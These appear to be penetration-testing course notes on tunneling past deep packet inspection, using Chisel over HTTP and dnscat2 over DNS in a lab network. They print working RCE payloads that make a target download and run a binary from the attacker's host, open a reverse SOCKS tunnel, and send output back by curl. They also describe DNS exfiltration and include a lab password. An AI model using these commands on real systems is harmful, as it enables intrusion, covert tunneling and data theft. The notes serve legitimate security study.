---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Module 19: Tunneling Through Deep Packet Inspection

## HTTP Tunneling Theory and Practice

### HTTP Tunneling Fundamentals

Because of things like _Deep Packet Inspection (DPI)_ we may only be able to communicate via a specific protocol, in this case HTTP. Essentially, we'll be doing the same thing as we did in the last module where we tunneled traffic through our SSH tunnel, but this time through HTTP.

### HTTP Tunneling with Chisel

Introducing _Chisel_! Chisel is a HTTP tunneling tool that encapsulates our data stream within HTTP, using the SSH protocol within the tunnel so data is encrypted. Let's get teh Chisel started.

{% code overflow="wrap" lineNumbers="true" %}
```bash
kali@kali:~$ sudo cp $(which chisel) /var/www/html/
kali@kali:~$ sudo systemctl start apache2

# Setting up a tcpdump to log the incoming traffic
kali@kali:~$ sudo tcpdump -nvvvXi tun0 tcp port 8080

# Utilizing our RCE to download the chisel client and make it executable
# The command: wget 192.168.118.4/chisel -O /tmp/chisel && chmod +x /tmp/chisel
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.118.4/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/

# Setting up the chisel server
kali@kali:~$ chisel server --port 8080 --reverse

# Making the chisel client connect, setting up a reverse SOCKS tunnel
# The command: /tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%27%29.start%28%29%22%29%7D/

# Huh... nothing happened. Time too redirect stdout and strderr to a file, sending the contents of that file over http back to our Kali box.
# The command: /tmp/chisel client 192.168.118.4:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.118.4:8080/
kali@kali:~$curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%20%26%3E%20/tmp/output%20%3B%20curl%20--data%20@/tmp/output%20http://192.168.118.4:8080/%27%29.start%28%29%22%29%7D/

# The error found was /tmp/chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32' not found (required by /tmp/chisel)/tmp/chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by /tmp/chisel) [|http]
# Our steps to troubleshoot this one involves checking the version of our chisel client via chisel -h. Researching this version compiled with Go 1.20.7 indicated other errors. Further research finds that there is a Go 1.19-compiled Chisel 1.81 binary for Linux on amd64 processors. We can then redownload this new agent and test again. Success! The chisel server also indicates an inbound connection.

# Using ncat to push ssh through the socks proxy.
kali@kali:~$ sudo apt install ncat
kali@kali:~$ ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
```
{% endcode %}

## DNS Tunneling Theory and Practice

### DNS Tunneling Fundamentals

Example of exfiltration via DNS: making DNS queries to HEX strings.domainwecontrol.com where the HEX strings are bits of encoded binary/sensitive data.

Example of infiltration via DNS: Hosting our own DNS server with txt records, then querying them from an _internal_ device.

### DNS Tunneling with dnscat2

Starting the dnscat2 server:

```bash
kali@felineauthority:~$ dnscat2-server feline.corp

# From the internal device
database_admin@pgdatabase01:~$ cd dnscat/
database_admin@pgdatabase01:~/dnscat$ ./dnscat feline.corp

# Back on the kali box running dnscat2 we see a session established
dnscat2> New window created: 1
Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
For added security, please ensure the client displays the same string:

>> Annoy Mona Spiced Outran Stump Visas

dnscat2>

# Interacting with the session created
dnscat2> windows
0 :: main [active]
  crypto-debug :: Debug window for crypto stuff [*]
  dns1 :: DNS Driver running on 0.0.0.0:53 domains = feline.corp [*]
  1 :: command (pgdatabase01) [encrypted, NOT verified] [*]
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
For added security, please ensure the client displays the same string:

>> Annoy Mona Spiced Outran Stump Visas
This is a command session!

That means you can enter a dnscat2 command such as
'ping'! For a full list of clients, try 'help'.

command (pgdatabase01) 1> ?

Here is a list of commands (use -h on any of them for additional help):
* clear
* delay
* download
* echo
* exec
* help
* listen
* ping
* quit
* set
* shell
* shutdown
* suspend
* tunnels
* unset
* upload
* window
* windows
command (pgdatabase01) 1>

# Now let's get the DNS tunneling setup via the listen command
command (pgdatabase01) 1> listen --help
Error: The user requested help
Listens on a local port and sends the connection out the other side (like ssh
	-L). Usage: listen [<lhost>:]<lport> <rhost>:<rport>
  --help, -h:   Show this message
command (pgdatabase01) 1> listen 127.0.0.1:4455 172.16.2.11:445
Listening on 127.0.0.1:4455, sending connections to 172.16.2.11:445

# Finally, let's utilize the DNS tunneling to try and list SMB shares
kali@felineauthority:~$ smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
Password for [WORKGROUP\hr_admin]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
    	scripts         Disk
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.50.63 failed (Error NT_STATUS_CONNECTION_REFUSED)
Unable to connect with SMB1 -- no workgroup available
```
